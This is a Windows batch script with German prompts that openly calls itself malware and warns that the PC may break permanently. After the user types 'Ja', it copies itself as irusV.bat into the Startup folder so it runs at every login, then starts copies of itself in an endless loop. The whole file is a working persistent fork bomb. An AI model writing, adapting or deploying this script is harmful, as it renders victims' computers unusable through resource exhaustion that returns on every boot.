@echo off
if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\irusV.bat" (
    goto vloop
) else (
    goto fts
)
:fts
echo Willst du, dass dieser PC PERMANENT KAPUTTGEHT? DER BESITZER DIESER MALWARE UEBERNIMMT KEINE HAFTUNG FUER ALLE SCHAEDEN AN IHREM GERAET! FORTFAHREN (Ja/Nein)?
:ftas
set /P allow=""

:check
if %allow% == Ja (
    goto startv
) else (
    goto checktwo
)

:checktwo
if %allow% == Nein (
    goto end
) else (
    cls
    echo Gebe entweder "Ja" oder "Nein" ein!
    goto ftas
)




:startv
set path="%~dp0\irusV.bat"
C:\Windows\System32\xcopy.exe "%path%" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
:vloop
start irusV.bat
goto vloop

:end
echo Beende...
C:/Windows/System32/timeout.exe /T 3 >nul
